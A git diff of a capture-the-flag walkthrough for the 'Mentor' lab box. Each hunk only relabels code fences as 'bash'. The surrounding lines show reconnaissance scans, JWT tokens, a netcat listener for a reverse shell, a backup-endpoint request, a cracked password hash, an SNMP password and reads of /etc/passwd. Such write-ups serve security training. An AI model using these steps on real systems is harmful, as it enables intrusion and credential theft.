@@ -41,7 +41,7 @@ sudo nmap -sC -sV -vv -oA nmap/mentor 10.10.11.193
 
 **Results:**
 
-```
+```bash
 PORT   STATE SERVICE REASON         VERSION
 22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey:
@@ -72,7 +72,7 @@ sudo nmap -sU --min-rate 10000 10.10.11.193
 
 **UDP Scan Results:**
 
-```
+```bash
 PORT      STATE  SERVICE
 161/udp   open   snmp
 1050/udp  closed cma
@@ -90,7 +90,7 @@ Great! We found SNMP running on UDP port 161.
 
 Accessing `http://10.10.11.193:80` redirects to `http://mentorquotes.htb/`. This appears to be a Flask application based on the server headers:
 
-```
+```bash
 HTTP/1.1 200 OK
 Date: Wed, 14 May 2025 12:56:00 GMT
 Server: Werkzeug/2.0.3 Python/3.6.9
@@ -108,7 +108,7 @@ ffuf -u http://mentorquotes.htb -H 'HOST: FUZZ.mentorquotes.htb' \
 ```
 
 **Results:**
-```
+```bash
 10.10.11.193 mentorquotes.htb api.mentorquotes.htb
 ```
 
@@ -142,7 +142,7 @@ We need JWT authentication. Let's test the registration and login functionality:
 
 We can get a JWT token by signing up and logging in:
 
-```
+```bash
 Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEyMzQ1NiIsImVtYWlsIjoi\
 MTIzNEBleGFtcGxlLmNvbSJ9.2VA3k2okByNuNtJ0vfrpgzdVCbN5N4aV_0d1vdGg5vM
 ```
@@ -228,7 +228,7 @@ First, let's get a session ID for the `james` user:
 ![Session ID](/images/mentor-htb/mentor-12.png)
 
 With a valid JWT token:
-```
+```bash
 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0Bt\
 ZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0
 ```
@@ -282,7 +282,7 @@ rlwrap nc -nlvp 9001
 
 Since the server has limited workers, we need to use nohup to avoid hanging:
 
-```http
+```bash
 POST /admin/backup HTTP/1.1
 Host: api.mentorquotes.htb
 Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwi\
@@ -374,7 +374,7 @@ From the API endpoints, we can extract user data including password hashes:
 
 Using CrackStation, we can crack the MD5 hashes:
 
-```
+```bash
 53f22d0dfa10dce7e29cd31f4f953fd8:MD5:123meunomeeivani
 ```
 
@@ -400,7 +400,7 @@ ps -ef --forest | less -S
 
 We can see Docker containers running:
 
-```
+```bash
 root        1684    1269  0 18:44 ?        00:00:00  \_ /usr/bin/docker-proxy -proto tcp -host-ip 172.22.0.1 -host-port 5432 -container-ip 172.22.0.2 -container-port 5432
 root        1794    1269  0 18:44 ?        00:00:00  \_ /usr/bin/docker-proxy -proto tcp -host-ip 172.22.0.1 -host-port 8000 -container-ip 172.22.0.3 -container-port 8000
 root        1918    1269  0 18:44 ?        00:00:00  \_ /usr/bin/docker-proxy -proto tcp -host-ip 172.22.0.1 -host-port 81 -container-ip 172.22.0.4 -container-port 80
@@ -414,7 +414,7 @@ PostgreSQL is running on port 5432.
 ss -tlnp
 ```
 
-```
+```bash
 State          Recv-Q         Send-Q                  Local Address:Port                    Peer Address:Port         Process
 LISTEN         0              4096                       172.22.0.1:81                           0.0.0.0:*
 LISTEN         0              4096                    127.0.0.53%lo:53                           0.0.0.0:*
@@ -432,7 +432,7 @@ LISTEN         0              128                              [::]:22          
 cat /etc/apache2/sites-available/000-default.conf
 ```
 
-```apache
+```bash
 <VirtualHost *:80>
     ProxyPreserveHost On
     ServerName mentorquotes.htb
@@ -474,7 +474,7 @@ grep -v '^#' /etc/snmp/snmpd.conf
 
 **Critical Finding:**
 
-```
+```bash
 createUser bootstrap MD5 SuperSecurePassword123__ DES
 rouser bootstrap priv
 
@@ -493,7 +493,7 @@ We found another password: `SuperSecurePassword123__`
 cat /etc/passwd | grep sh
 ```
 
-```
+```bash
 root:x:0:0:root:/root:/bin/bash
 sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
 svc:x:1001:1001:,,,:/home/svc:/bin/bash
@@ -516,7 +516,7 @@ su james
 sudo -l
 ```
 
-```
+```bash
 Matching Defaults entries for james on mentor:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
 
